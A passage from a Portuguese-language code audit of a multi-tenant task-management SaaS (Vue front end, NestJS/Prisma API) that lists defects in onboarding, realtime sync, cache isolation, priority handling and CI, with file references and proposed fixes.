**Como confirmar em 5 minutos.** `SELECT * FROM "Quarter" WHERE "companyId" = '<id>'` no banco de dev. Se voltarem exatamente 4 linhas sem coluna de ano, está confirmado.

**A correção.** Há duas rotas, e a escolha importa (ver seção 7, decisão 2):

- **Rota conservadora, esforço G:** adicionar `year Int` a `Quarter`, trocar a unique para `@@unique([companyId, year, label])`, migration de dados atribuindo o ano corrente aos registros existentes (`UPDATE "Quarter" SET year = 2026`), seeding lazy por ano em vez de seeding único, e `?year=` em todos os endpoints. Mais um seletor de ano na navegação.
- **Rota profunda, esforço GG:** parar de derivar o período da tarefa da hierarquia `Month` e passar a usar campos próprios em `Activity` (`companyId`, `startDate`, `dueDate`, um `periodKey YYYY-MM` gerado), mantendo `Month` como agrupamento legado opcional (`board-tasks-api.md`, P2, correção 2).

Custo de adiar: a migração fica mais cara a cada mês de dado acumulado, e toda feature de calendário construída em cima da estrutura atual precisa ser refeita depois.

---

### Problema 6. O funil comercial termina em tela vazia

**BLOQUEIA RECEITA**

**O que acontece.** O caminho de uma empresa nova, passo a passo, com o código (`produto.md`, seção 4):

1. Visitante chega em `/signup`, que promete "Acesso gratuito ao Workflow" (`work-flow/src/features/auth/SignupView.vue:71-73`).
2. O cadastro bate em `POST /user`, público e sem guard (`workflow-api/src/user/user.controller.ts:24-30`). O service cria o usuário e, por decisão explícita e correta de segurança, **nunca cria vínculo com empresa** (`workflow-api/src/user/user.service.ts:22-34`).
3. Auto-login e redirect para `/`. O usuário chega ao dashboard sem nenhuma empresa (`SignupView.vue:42-51`).
4. Sem `activeCompany`, o `ensureActiveCompany` busca as empresas, encontra lista vazia e não faz nada (`work-flow/src/composables/useDashboardOrchestration.ts:303-320`). Todas as chamadas seguintes vão sem `x-company-id` e falham no guard.
5. Não há saída. O único `CreateCompanyModal` vive dentro de `CompanyUsersView` (`work-flow/src/features/companies/CompanyUsersView.vue:162-163`), cuja rota exige `meta: { requiredRole: 'ADMIN' }` (`work-flow/src/router/index.ts:73`). Um usuário sem empresa tem `role = null` e é redirecionado para a home.

O único lugar do produto onde se cria uma empresa está atrás de uma porta que exige já pertencer a uma empresa como admin. E o backend **suporta o caso**: `CompanyService.create` tem uma exceção de bootstrap explícita para o usuário sem vínculo nenhum (`workflow-api/src/company/company.service.ts:57-70`). A capacidade existe. Falta a tela.

**O resto do funil também está aberto.**

- **Sem convite.** Para colocar um colega na empresa, o admin escolhe numa lista com todos os usuários da plataforma, nome e e-mail (`work-flow/src/features/companies/components/AddUserModal.vue:47` chamando `GET /user`). Além de vazar PII entre clientes (Problema 1), exige que a pessoa já tenha se cadastrado sozinha antes.
- **Sem e-mail.** `@sendgrid/mail` está no `package.json` da API e nunca é importado em `src/`. Sem convite, sem reset de senha, sem digest, sem aviso de prazo. `auth.controller.ts` só tem `POST /auth/login`, então **quem esquece a senha fica trancado para sempre**. E o `SENDGRID_FROM_EMAIL` no `.env` real está vazio (`qualidade.md`, 6.6).
- **Sem dados de exemplo.** Empresa nova nasce com 12 meses vazios, board vazio, roadmap vazio e dashboard com zeros. Não há nada para o usuário olhar e entender o produto.
- **Sem migração visível.** O importador de Jira XML existe (`POST /import/jira-xml`) e está escondido, sem entrada na navegação.
- **CNPJ obrigatório e único** (`workflow-api/prisma/schema.prisma:43`) é, sozinho, um bloqueio de cadastro. Nenhum SaaS moderno pede CNPJ para criar workspace, e isso impede registrar cliente pessoa física, projeto interno, ou dois projetos do mesmo cliente.

**Por que importa.** Cada cliente novo custa uma intervenção manual do fundador no banco. Isso não é um SaaS, é um serviço gerenciado. Sem isso, não existe trial, não existe venda self-serve, e não existe nem sequer uma demonstração honesta para um prospect.

**A correção.** Rota `/welcome` que detecta `companies.length === 0` e oferece criar a empresa chamando `POST /company` (o backend já aceita); CNPJ opcional, com slug no lugar; um `MailModule` com SendGrid; model `Invitation` com token, e-mail, papel e expiração, mais `POST /company/:id/invite` e uma tela de aceite que cria a conta já vinculada; seed opcional de dados de exemplo marcados como demonstração e removíveis num clique; reset de senha com token expirável.

**Esforço:** M para o e-mail, M para o convite, G para o onboarding completo com templates e seed.

---

### Problema 7. O realtime cobre exatamente 1 dos 15 caminhos de escrita

**O que acontece.** O levantamento exaustivo de `emitToCompany|emitToUser` em toda a API encontrou 11 eventos (`realtime.md`, 1.2). Dos que dizem respeito a tarefa, existe **um**: `activity:moved`, emitido só por `updateStatus` e `move`, via `emitMoved` (`workflow-api/src/activity/activity.service.ts:339-361`).

Não emitem nada:

| Ação | Arquivo:linha |
|---|---|
| Criar tarefa | `workflow-api/src/activity/activity.service.ts:45-83` |
| Editar título, descrição, prazo, prioridade, responsáveis, mês | `activity.service.ts:102-151` |
| Apagar tarefa | `activity.service.ts:396-400` |
| Anexar e remover arquivo | `activity.service.ts:402-432` |
| Editar, apagar e reagir a comentário | `workflow-api/src/comment/comment.service.ts:104-151` |
| Marcar notificação como lida | `workflow-api/src/notification/notification.service.ts:80-99` |
| Todo o domínio de notas, roadmap, bug report, calendário, QR, quarters, membros e variáveis | nenhum desses módulos importa `RealtimeService` |

E o `update` também **não grava no feed**, porque `feed.record` só é chamado no `notifyStatusChange` (`activity.service.ts:325`), então nem o sinal indireto de `feed:new` existe.

**Por que importa.** Com duas pessoas trabalhando, o board fica desatualizado em silêncio. Tarefa criada por outro não aparece; tarefa excluída continua no board e dá erro ao clicar; título renomeado, prioridade e responsável alterados não atualizam. A percepção correta do usuário é "o WebSocket não atualiza 100%", e a percepção está certa: ele atualiza o arraste e mais nada.

Há três agravantes que fazem isso parecer intermitente, o que é a pior forma de bug:

- **As rooms vêm do JWT, não do banco** (`workflow-api/src/realtime/realtime.gateway.ts:65-72`). Quem foi adicionado a uma empresa depois do login não recebe nenhum evento dela até relogar. E quem foi removido continua recebendo `comment:new`, `feed:new` e `activity:moved` por até 7 dias (`realtime.md`, P-02). Isso é vazamento passivo e contínuo.
- **O `feed:new` de outra empresa é injetado na timeline da empresa ativa.** O socket entra em todas as rooms do usuário, o payload tem `companyId`, mas a interface do front nem declara o campo e o handler não filtra (`work-flow/src/composables/useCompanyFeed.ts:24-26`; `work-flow/src/service/realtime/realtime-service.ts:35-44`). Quem é membro de 2 ou mais empresas vê eventos misturados sem marcação nenhuma.
- **Nada refaz fetch quando a aba volta ao foco.** `refetchOnWindowFocus: false` é global (`work-flow/src/main.ts:55`), e grep por `visibilitychange`, `window.addEventListener('focus'` e `navigator.onLine` em todo o `src/` volta zero (`realtime.md`, P-06). Eventos perdidos durante uma queda de rede não têm replay: não existe log de eventos nem número de sequência.

**Por que parece "às vezes".** Aqui há uma sutileza que explica a intermitência e que vale registrar, porque dois relatórios parecem discordar e não discordam. `realtime.md` (P-03b) diz que o `onReconnect` **nunca** dispara ao voltar para o board, porque o socket já está conectado (o `InboxBell` do shell mantém a conexão viva nos três shells: `CanvasShell.vue:173`, `CommandShell.vue:88`, `FocusShell.vue:223`). Já `board-front.md` (P8) e `realtime.md` (P-10) dizem que o `connect` dispara na primeira montagem e causa **duas** requisições. As duas coisas são verdade em situações diferentes: no F5 frio, o socket conecta depois do mount e o handler dispara (carregamento duplo); na navegação de volta dentro da SPA, o socket já está conectado e nada dispara (dado velho). O mesmo código produz os dois sintomas opostos dependendo de como você chegou na tela. É exatamente por isso que o bug parece aleatório.

**A correção.**
1. Backend, esforço P a M: extrair `emitActivityChanged(companyId, activity, kind)` e chamar em create, update, remove e anexo, com payload `{ activityId, monthId, kind, actorId, updatedAt }`. Incluir o `actorId` para o front ignorar o próprio eco. Gravar feed no `update` também.
2. Derivar as rooms da membership no banco no `handleConnection` em vez do claim do JWT. Custa uma query por conexão.
3. Front, esforço P: filtrar `feed:new` e `comment:new` por `companyId`.
4. Front, esforço M: um `useRealtimeSync` montado uma vez no `AppShell` que traduza cada evento em invalidação de query, tirando a lógica de sincronização das telas (`arch-front.md`, O-03).
5. Estrutural, esforço M: um envelope único `wf:event { v, type, companyId, entityId, actorId, at, patch? }`. Hoje adicionar um evento custa 5 pontos de edição no front (`realtime-service.ts:143-195`), e esse é o motivo estrutural de o realtime ter parado em 11 eventos (`realtime.md`, O-01).
6. Antes de qualquer segunda instância: `@socket.io/redis-adapter`. Hoje a presença vive num `Map` na memória do processo (`workflow-api/src/realtime/realtime.service.ts:17`) e não existe adapter, então com 2 réplicas um `emit` da instância A nunca chega em quem está na instância B (`realtime.md`, P-13).

---

### Problema 8. Logout e troca de empresa não limpam cache nem socket

**`confirmar antes de agir` · RISCO DE DADO ENTRE EMPRESAS E ENTRE USUÁRIOS**

**O que acontece.** São dois bugs irmãos com a mesma raiz.

**Logout.** `clearSession()` só remove `token` e `activeCompany` do localStorage (`work-flow/src/service/api.ts:87-91`), e o logout navega por `router.push('/login')` sem reload (`work-flow/src/core/components/shells/shared/UserMenu.vue:31-35`; `work-flow/src/components/CommandPalette.vue:221-226`). Não chama `queryClient.clear()` nem `realtimeService.disconnect()`. O `disconnect()` existe no serviço de realtime e **não é chamado em lugar nenhum** (`work-flow/src/service/realtime/realtime-service.ts:201-205`, grep confirma zero call sites externos).

Como o socket é singleton de módulo e a navegação é SPA, o módulo JS não é recarregado. No login seguinte, `getSocket()` faz `socket.auth = { token }`, mas o `subscribe()` termina com `if (!nextSocket.connected) nextSocket.connect()`, e como o socket **já está conectado** com a sessão antiga, nenhum handshake novo acontece e o `auth` novo nunca chega ao servidor (`realtime.md`, P-01).

Resultado: em máquina compartilhada, usuário A sai, usuário B entra sem F5, e B passa a receber `notification:new`, `feed:new`, `comment:new` e `activity:moved` **das empresas de A**, além de ver o cache do TanStack de A (inbox, dashboard, QR) por até 10 minutos de `gcTime`.

**Troca de empresa.** As duas trocas vivas fazem soft switch sem tocar no `queryClient` (`work-flow/src/core/components/shells/shared/CompanySwitcher.vue:57-65`; `work-flow/src/components/CommandPalette.vue:228-235`). E as query keys não são escopadas por empresa: `['inbox','list']`, `['time','current']`, `['qr']`, `['dashboard','workspace']` (`arch-front.md`, P-02). Como o `x-company-id` é injetado no interceptor a partir do localStorage, **a mesma chave de cache guarda respostas de empresas diferentes**.

**Ironia dupla.** O código correto existe e está morto nos dois casos. `workspaceStores.switchCompany` faz `window.location.href = '/'` e nunca é chamado (`work-flow/src/stores/workspaceStores.ts:237-240`). E o interceptor de 401 já faz reload duro, com o comentário explícito "Redirect hard garante reset total de estado (Pinia, Vue Query, sockets)" (`work-flow/src/service/api.ts:112`). O logout manual simplesmente não seguiu a própria regra da casa.

**Divergência entre relatórios.** `board-front.md` (P14) trata o `switchCompany` com reload duro como um **problema** ("perde tudo, pisca branco"). `arch-front.md` (P-02) trata o mesmo código como a **versão correta** que está morta. **Minha leitura: os dois têm razão em eixos diferentes.** O reload duro é seguro e ruim de UX; o soft switch é bom de UX e inseguro. A saída que resolve os dois é soft switch mais `queryClient.clear()` mais chaves prefixadas por empresa, mantendo a rota atual em vez de jogar para a home.

**Como confirmar em 5 minutos.** Abra o app, faça login como A, deslogue pelo menu, logue como B na mesma aba sem F5, e observe o painel de rede ou o sino de notificações. Se aparecer contagem ou evento de empresa de A, está confirmado.

**A correção.**
1. Um `useSession()` único: `clearSession()` mais `queryClient.clear()` mais `realtimeService.disconnect()` mais `window.location.assign('/login')`. Esforço P.
2. Um `useCompanySwitch()` único usado nos dois pontos, com `queryClient.clear()`. Esforço P.
3. Definitivo: um `composables/queryKeys.ts` onde toda chave nasce de `key(companyId, ...rest)`, transformando isolamento em invariante estrutural em vez de disciplina. Esforço M, e destrava várias outras coisas (invalidação dirigida por evento de socket, prefetch no hover, refetch por foco por feature).
4. No `getSocket()`, comparar o token atual com o usado no handshake e forçar reconexão quando mudar.

Bug vizinho da mesma família, que vale corrigir junto: `TasksView.vue:96` faz `const companyId = computed(() => localStorage.getItem('activeCompany') ?? '')`. Esse `computed` não tem nenhuma dependência reativa, então o Vue calcula uma vez e cacheia para sempre; as queries `['quarters', companyId]` e `['backlog', companyId]` ficam presas na empresa que estava ativa na primeira renderização (`realtime.md`, P-12). A versão correta está em `TaskDetailsView.vue:135-137`, usando o store reativo com localStorage só de fallback.

---

### Problema 9. Os números do board mentem

**O que acontece.** Três defeitos independentes que somam para o mesmo efeito: o usuário não pode confiar no que a tela mostra.

**a) Subtarefas contadas como tarefas.** O board mensal filtra `where: { parentId: null }` com o comentário "only parent tasks on the board" (`workflow-api/src/quarter/quarter.service.ts:42-43`). O `getWorkspace`, que alimenta o `/board` agregado e o dashboard, **não filtra** (`workflow-api/src/dashboard/dashboard.service.ts:45-50`). Consequência: subtarefas aparecem como cards soltos no board agregado, misturadas às tarefas pai; o contador do cabeçalho, os contadores das colunas e as barras de progresso não batem com os do `/tasks/:month`; e `metrics.total`, `progress`, `overdue` e `myAssignments` do dashboard ficam inflados. É uma linha de correção.

**b) A escala de prioridade significa coisas opostas em duas telas.**

```ts
// work-flow/src/features/board/BoardView.vue:41-46  -> 0 é o MAIS crítico
0: { label: 'P0', token: 'var(--err)' }, 1: { label: 'P1', token: 'var(--warn)' }, ...

// work-flow/src/components/tasks/KanbanBoard.vue:135-145  -> 0 é o MENOS crítico
0: 'Baixíssima', 1: 'Baixa', 2: 'Média', 3: 'Alta', 4: 'Crítica', 5: 'Bloqueante'
```

`TaskDetailsView.vue:636-643` segue a primeira, `TaskForm.vue:37-44` segue a segunda. A mesma tarefa com `priorityNumber = 0` é vermelha crítica numa tela e verde "Baixíssima" na outra. O backend não define semântica: `CreateActivityDto.priorityNumber` é só `@IsInt() @Min(0)` com default 0 (`workflow-api/src/activity/dto/create-activity.dto.ts:21-26`), e o form de criação manda 0 por padrão (`TasksView.vue:144`). E a ordenação do board (`a.priority - b.priority`, "P0 primeiro") fica errada sob a outra interpretação.

Detalhe que fecha a armadilha: o default `priorityNumber ?? 0` na criação significa "sem prioridade" na intenção do formulário e "P0 crítico" na tela de detalhe. Toda tarefa criada nasce marcada como crítica em uma das telas.

**c) Salvar qualquer coisa rebaixa P0 para P1.**

```ts
// work-flow/src/features/tasks/TaskDetailsView.vue:64 (e :80, :308, :507, :514, :579)
priorityNumber: Number(activity.priorityNumber) || 1,
```

`Number(0)` é `0`, que é falsy, então `|| 1` transforma P0 em P1. Pior: `buildActivityMovePayload` (linha 80) é usado no `changeActivityMonth` (403-427), então **só trocar o mês no select da barra lateral já rebaixa a prioridade da tarefa**, sem o usuário tocar no campo (`tasks-front.md`, P3).

**d) Arrastar um card de outra empresa no `/board` sempre falha.** O `/board` mostra atividades de todas as empresas, mas o front não manda o `companyId` do card: o interceptor injeta a empresa ativa do localStorage (`work-flow/src/service/api.ts:79-81`). No backend, `updateStatus` chama `findFirst({ where: { id, month: { quarter: { companyId } } } })` (`workflow-api/src/activity/activity.service.ts:93-100`), então card da empresa B com header da empresa A dá 404. O card pula de coluna pelo update otimista, volta sozinho e aparece o toast "Não foi possível mover a atividade" (`board-front.md`, P1). Nota positiva: o escopo por empresa está **correto** aqui, não há vazamento. O problema é de usabilidade e de o front não respeitar o próprio modelo multi-empresa.

**e) O board agregado destrói a ordem manual do kanban.** O `/board` chama `PATCH /activity/:id/status`, que emite `activity:moved` com `position: null` (`activity.service.ts:186`), e o consumidor do outro board trata `null` empurrando o card para o fim da coluna (`TasksView.vue:284-288`). Além disso, `getWorkspace` nem seleciona `position`. São dois endpoints divergentes para a mesma ação do usuário: `updateStatus` muda o status sem tocar em `position` e sem compactar a coluna de origem, enquanto `move` faz tudo certo (`board-tasks-api.md`, P6).

**Por que importa.** Um produto de gestão vive de o gestor confiar no número. Quando a contagem do board não bate com a do dashboard, e a prioridade muda de significado entre telas, o usuário para de usar o número e volta para a planilha. É a forma mais silenciosa de churn.

**A correção.** Ordem por retorno imediato:
1. Adicionar `parentId: null` no `where` do `getWorkspace`. Uma linha (esforço P).
2. Consertar `Number(x) || 1` para `Number.isFinite(n) ? n : 1` nos seis pontos (esforço P).
3. Criar `features/tasks/priority.ts` como fonte única de label, token de cor e ordem, consumido por `BoardView`, `KanbanBoard`, `TaskDetailsView`, `TaskForm` e o filtro do `TasksView`. Decidir a escala (recomendação na seção 7, decisão 5) e travar o range no DTO com `@Max`.
4. `patchActivityStatus` passa a aceitar `companyId` e enviar `headers: { 'x-company-id': task.companyId }`. O interceptor já respeita header explícito desde o commit `edc79fb` (esforço P).
5. Deprecar `PATCH /:id/status` e fazer tudo por `move`, com `position` opcional significando fim da coluna (esforço P).

---

### Problema 10. Não existe rede de segurança nenhuma: zero teste, zero CI, deploy não versionado

**O que acontece.**

- **Testes.** A API tem exatamente um `.spec.ts`, e é o scaffold gerado pelo `nest g service`, com um único `expect(service).toBeDefined()` (`workflow-api/src/shared/crypto/crypto.service.spec.ts`, 18 linhas). Nem o `encrypt`/`decrypt` do próprio serviço testado é exercitado. O script `test:e2e` aponta para uma pasta `test/` que **não existe**. O front não tem nenhum runner instalado: nem vitest, nem `@vue/test-utils`, nem playwright, nem script `test` (`qualidade.md`, seção 1).
- **CI.** Nenhum dos dois repositórios tem `.github/`. Sem workflows, sem PR template, sem CODEOWNERS, sem dependabot. Também não há `.gitlab-ci.yml` nem equivalente. E o fluxo real é commit direto na `main`, que é a branch de deploy. Não há gate nenhum entre "escrevi código" e "está em produção" (`qualidade.md`, seção 2).
- **Lint.** A configuração existe e é razoável nos dois repos, mas todos os scripts têm `--fix` embutido, então não existe comando de verificação. Rodando sem `--fix`: 572 problemas na API (544 erros) e 282 no front (247 deles `no-explicit-any`). Os 281 `no-unsafe-*` da API são sinal real de `any` implícito circulando sobre payloads externos (Prisma raw, SDK da Anthropic, Google APIs, headers), exatamente onde erro de tipo vira 500 em runtime (`qualidade.md`, seção 3).
- **Tipagem.** Os dois repos passam no typecheck, mas o `tsconfig.json` da API afrouxa deliberadamente o que mais pega bug: `noImplicitAny: false`, `strictBindCallApply: false`, sem `"strict": true` (`qualidade.md`, seção 4). O front está com a régua certa (herda `@vue/tsconfig/tsconfig.dom.json` e liga `noUncheckedIndexedAccess`). A API não.
- **Deploy.** A API não tem `railway.json`, `Procfile`, `Dockerfile`, `nixpacks.toml` nem `.nvmrc`. Toda a configuração vive só no painel do Railway. E o `start:prod` aponta para `node start-ipv4.js`, arquivo que **não existe no disco nem no histórico do git** (`qualidade.md`, 8.2). Ou seja: o comando real de produção não está documentado em lugar nenhum. Também não há `engines`, então a versão de Node em produção é o que o Railway decidir e pode mudar sozinha num redeploy.
- **Documentação da API fora do git.** O `.gitignore` da API tem `docs/` inteiro. Toda a spec da API e todo o contexto de decisão arquitetural existem apenas no disco de uma máquina (`qualidade.md`, 8.3). O front faz o oposto e versiona corretamente.
- **Observabilidade.** Zero error tracking (`sentry|datadog|opentelemetry|pino|winston` volta vazio nos dois repos). Nenhum handler global de erro no front: `app.config.errorHandler`, `onErrorCaptured`, `unhandledrejection` e `window.onerror` não aparecem em lugar nenhum. Logs não estruturados, sem métricas, sem alerta. O `/health` existe e é bem feito, e nada o consulta (`qualidade.md`, seção 7).
- **Bundle.** Zero code splitting: 29 imports estáticos de views no router e zero `component: () => import(...)`. O build gera 3,2 MB de JS e 1,38 MB de CSS num chunk único, mais 3,6 MB de fontes do Material Design em quatro formatos (ttf, eot, woff, woff2), para **32 usos de `mdi-` em 7 arquivos**. `dist/` total: 8,3 MB. Quem abre a tela de login baixa 1 MB gzipado, incluindo TipTap, ECharts, `perfect-freehand`, `highlight.js` e Yjs, sendo que o Canvas está **desligado por feature flag** e importado estaticamente mesmo assim (`arch-front.md`, P-01; `qualidade.md`, 8.4).

**Por que importa.** Toda a lista deste documento é uma lista de refatorações, e refatoração sem teste e sem CI é feita no escuro. Especificamente: a classe de bug dominante da API é "o service confia no id que veio de fora" (Problema 1), e ela passou despercebida justamente porque não há um único teste de isolamento multi-tenant. O `vue-tsc` passar limpo é falso conforto quando `TaskDetailsView.vue` tem `const activityInfo = ref<any>(null)` e mais 40 `any` no mesmo arquivo.

**Divergência entre relatórios.** `arch-front.md` (P-01, item 5) afirma que `vueDevTools()` é chamado incondicionalmente em `vite.config.ts:12` e "injeta overlay e cliente de inspeção no build de produção". `qualidade.md` (seção 12) diz o contrário: "o plugin só aplica em `serve`, mas a config não deixa isso explícito". **Minha leitura: `qualidade.md` está mais provavelmente certo**, porque o `vite-plugin-vue-devtools` declara `apply: 'serve'` internamente. De qualquer forma, tornar explícito custa uma linha e elimina a dúvida.

Outra divergência menor de contagem: `arch-front.md` conta 160 ocorrências de `: any` e `qualidade.md` conta 247 `no-explicit-any` do ESLint. Não é contradição, são métodos diferentes de contagem (a anotação `: any` versus toda ocorrência explícita, incluindo `as any`, `any[]` e genéricos). Igualmente, `produto.md` fala em 41 módulos na API e `arch-api.md` em 37, o que provavelmente é pasta em `src/` versus módulo Nest registrado. Nada disso muda decisão.

**A correção, em ordem de retorno.**
1. GitHub Actions nos dois repos rodando `typecheck` mais `lint` sem `--fix` mais `build`, obrigatório em PR, `main` protegida. Adicionar `lint:check` e `format:check` no `package.json`. Meio dia (esforço P).
2. Versionar a config de deploy da API (`railway.json` ou `Dockerfile`), corrigir o `start:prod`, tirar `docs/` do `.gitignore`, adicionar `engines`. Meio dia (esforço P).
3. Sentry na API e no front, com `app.config.errorHandler` e `unhandledrejection`, correlacionado pelo `x-request-id` que já existe e cujo extrator `getApiRequestId` está exportado e **nunca usado** (`work-flow/src/service/api.ts:37`). Esforço P.
4. `vueDevTools` explicitamente só em dev; remover o barril do Vuetify (`import * as components` em `plugins/vuetify.ts:3-4` cancela o `autoImport` do plugin, e só 23 dos 95 `.vue` usam algum `<v-*>`); lazy loading nas rotas; `manualChunks`. Esforço P a M, corta o bundle inicial em mais de 70%.
5. Migrar os 32 `mdi-` para lucide e remover `@mdi/font`: elimina 3,6 MB de fontes. Esforço M.
6. Testes na ordem da dor: isolamento multi-empresa (e2e de matriz), guards e roles, `CryptoService` de verdade, `utils/date.ts` e `utils/duration.ts`, e três smoke tests de Playwright (login, abrir board, abrir tarefa) antes de encostar em qualquer refatoração grande. Esforço M.

---

### Menções honrosas (não entraram no top 10, mas doem)

- **`GET /dashboard/workspace` faz N+1 e carrega o histórico inteiro.** Uma query de atividades e uma de eventos **por empresa**, dentro de um `Promise.all`, sem `take`, sem filtro de período, incluindo subtarefas, com as contagens feitas em JavaScript depois (`workflow-api/src/dashboard/dashboard.service.ts:37-163`). Um usuário em 5 empresas com 2 mil tarefas cada baixa 10 mil linhas com responsáveis aninhados a cada abertura do dashboard. Mesmo padrão em `company.service.ts:136-159`. Correção: `groupBy` para contagens e `take` com cursor nas listas (esforço M).
- **Reordenar o kanban faz N updates sequenciais dentro da transação.** `for (let position = 0; ...) await tx.activity.update(...)` (`workflow-api/src/activity/activity.service.ts:261-301`). Uma coluna com 150 cards vira ~300 round-trips por arrastada, dentro de uma transação interativa com timeout padrão de 5 s do Prisma. E, mais grave para o futuro: se o board for filtrado por pessoa, o índice `position` que o front envia se refere à lista filtrada, não à coluna real, ou seja **implementar o filtro por pessoa hoje quebra o drag-and-drop** (`board-tasks-api.md`, P5). Correção: ordenação fracionária (LexoRank ou decimal) e contrato `{ beforeId, afterId }` em vez de `position` numérico.
- **Apagar tarefa pai órfã as subtarefas em vez de apagá-las.** A FK é `ON DELETE SET NULL` (`workflow-api/prisma/migrations/20260309181914_init_repo/migration.sql:139`) e o `remove` faz `delete` direto. Como o board filtra `parentId: null`, cada subtarefa **brota como card independente no kanban**, com `position` herdada. Sintoma percebido: "apaguei uma tarefa e apareceram cards estranhos no topo da coluna" (`board-tasks-api.md`, P4).
- **`PATCH /activity/:id` aceita responsáveis de qualquer empresa do sistema.** Não há validação de que os `userId` são membros da empresa dona da atividade (`activity.service.ts:75-79` e `:125-129`). Quando o status muda, `notifyStatusChange` grava notificação e emite por socket para `user:<id>` sem checar membership, então **o título de uma tarefa chega em tempo real para alguém de fora da empresa** (`board-tasks-api.md`, P7). Como o id vem de `GET /user`, que lista todo mundo, isso é explorável hoje.
- **Não existe como remover a data de entrega.** Quando o usuário limpa o campo, o override vira `undefined`, o spread apaga a chave, o `JSON.stringify` remove `undefined` do corpo e o backend nunca entra no ramo que grava `null` (`work-flow/src/features/tasks/TaskDetailsView.vue:511-519`; `workflow-api/src/activity/activity.service.ts:120`). Data de entrega é one-way: entrou, nunca mais sai. Isso alimenta diretamente a queixa do roadmap, porque datas erradas ficam para sempre povoando a timeline.
- **O cron de embeddings pode derrubar a API.** A cada 10 minutos itera **todas** as empresas e, para cada uma que mudou, faz reindexação **total** (não incremental), rodando o modelo transformers.js **serialmente, no mesmo processo Node que atende o HTTP** (`workflow-api/src/intelligence/intelligence-cron.service.ts:24`; `workflow-api/src/ai/ai.service.ts:229-241`). Node é single-threaded: durante isso todo request fica na fila. A busca semântica é pior: carrega **todos** os embeddings da empresa para a memória e calcula cosseno em JS, porque a coluna é `Float[]` e não `pgvector` (`workflow-api/src/intelligence/intelligence.service.ts:109-140`). Duas buscas simultâneas travam a API. É o que quebra primeiro se o uso dobrar (`qualidade.md`, seção 11).
- **Anexos vão para um bucket público com caminho previsível.** `${Date.now()}-${filename}`, sem `companyId` no path, sem signed URL, sem expiração (`workflow-api/src/supabase/supabase.service.ts:26-45`). Um `contrato-cliente.pdf` fica acessível a quem tiver o link ou adivinhar o timestamp. E quase nenhum `FileInterceptor` valida mimetype ou tamanho (`workflow-api/src/activity/controller.ts:120-132`), com as exceções corretas do bug report (18 MB) e do import (filtro `.xml`).
- **Sem soft delete, sem lixeira, sem histórico de campo.** Nenhum dos 30 modelos tem `deletedAt`. `DELETE /activity/:id` cascateia anexos, responsáveis, log, e deixa `FeedEvent` apontando para um `entityId` inexistente. E `ActivityLog` registra **apenas** mudança de status (`workflow-api/prisma/schema.prisma:177-188`): quem mudou o prazo, o título ou o responsável não fica registrado em lugar nenhum (`arch-api.md`, 2.17). Para um SaaS B2B onde várias pessoas mexem na mesma tarefa, "quem mudou meu prazo?" é uma pergunta que não tem resposta.
- **Subtarefa é excluída sem confirmação e sem undo**, a 10px do corpo clicável do item, enquanto excluir uma tarefa de topo **tem** dialog de confirmação (`work-flow/src/features/tasks/TaskDetailsView.vue:828-837` versus `TasksView.vue:305-328`). Incoerência com a própria base.
- **A página `/download` está quebrada em produção.** O botão aponta para um artefato de GitHub Actions (`work-flow/src/features/download/DownloadView.vue:6`), que expira em 90 dias e exige login no GitHub com acesso ao repositório privado. Qualquer visitante recebe erro.

---

## 4. As dores que você levantou

Uma seção por queixa. Cada uma tem o diagnóstico técnico (por que acontece, com arquivo e linha) e o desenho da solução. Onde a queixa tem mais de uma causa somada, elas estão separadas, porque consertar só uma não produz efeito visível e isso é a principal fonte de frustração em refatoração.

---

### 4.1 "O board não tem filtro por pessoa nem por mês"

**Diagnóstico.** A boa notícia primeiro: **os dados necessários já chegam ao front**. O item que o `/board` recebe traz `responsibles[]` com `id`, `name` e `isMe`, mais `quarter`, `month` e `monthId` (`work-flow/src/stores/workspaceStores.ts:28-46`). Filtro por pessoa e por mês é 100% client-side na tela agregada, sem tocar em backend nenhum.

O que existe hoje no `/board` são três filtros: busca por texto, empresa e prioridade (`work-flow/src/features/board/BoardView.vue:26-28,50-70`). Não existe filtro por pessoa, por mês, por trimestre, por "só as minhas" nem por atrasadas. Curiosidade reveladora: os toggles `filterMyActivities` e `filterOverdue` **existem no store**, com um getter `filteredActivities` pronto (`workspaceStores.ts:120-122,138-158`), e o `BoardView` ignora tudo isso e reimplementou a filtragem localmente. O getter do store é código morto na prática, porque o único consumidor possível seria a `WorkspaceView`, que está órfã.

Na tela mensal (`/tasks/:month`) existe filtro por responsável, mas com três defeitos (`tasks-front.md`, P12):

```ts
// work-flow/src/features/tasks/TasksView.vue:196-199
arr = arr.filter((t) => t.responsibles?.some((r) => r.user.name === selectedUser.value))
```

1. Filtra por **nome**, então dois "João Silva" na empresa colidem num filtro só.
2. As opções vêm dos cards carregados, não dos membros da empresa. Quem não tem card naquele mês não aparece no filtro, e a view **já carrega** os membros de verdade em `members` via `findMembers` (`TasksView.vue:124-135`) e não usa para isso.
3. Se o usuário for renomeado, o filtro salvo quebra.

Ainda no `TasksView`, `filterStatus` é declarado, entra no `filteredTasks`, conta no `activeFiltersCount` e é limpo no `clearFilters`, mas **nenhum controle no template escreve nele**: a barra de filtros só tem responsável e prioridade (`TasksView.vue:180,203-205,215,222`). O `computed` que esvaziaria a coluna nunca executa. A barra de filtros está literalmente pela metade.

E nada disso vai para a URL, o que significa que o filtro morre no unmount (isso conecta com a queixa 4.6).

**A parte que exige backend.** Filtrar client-side resolve a tela agregada, mas não resolve o problema real de escala nem o board de vários meses. Hoje o único endpoint de board é `GET /month/:monthId/board` e ele **não aceita nenhum query param**: não filtra por responsável, não filtra por status, não pagina, não aceita intervalo de meses (`workflow-api/src/quarter/quarter.controller.ts:35`; `board-tasks-api.md`, seção 3). Não existe **nenhum** endpoint em toda a API que aceite filtro por responsável. Um "board do trimestre filtrado pela Ana" exigiria 3 chamadas HTTP e filtragem no cliente.

**Armadilha importante.** Implementar o filtro por pessoa hoje **quebra o drag-and-drop**. O `reorderColumn` renumera a coluna inteira por `(monthId, status)` (`workflow-api/src/activity/activity.service.ts:261-301`), e o índice `position` que o front envia se refere à lista **filtrada**, não à coluna real. Ou seja: filtre por Ana, arraste um card, e as posições dos cards que não aparecem na tela são destruídas. Isso precisa ser resolvido antes ou junto (`board-tasks-api.md`, P5).

**Desenho da solução.**

**Fase A, imediata (esforço P).** Filtro client-side no `/board`, com estado na query string:

```ts
const filterPeople = ref<string[]>([])   // multi-select por userId (AppSelect já suporta multiple)
const filterMine = ref(false)            // usa a.isMine
const filterMonths = ref<string[]>([])   // chave estável cross-company: `${quarter}|${month}`
const filterOverdue = ref(false)
```

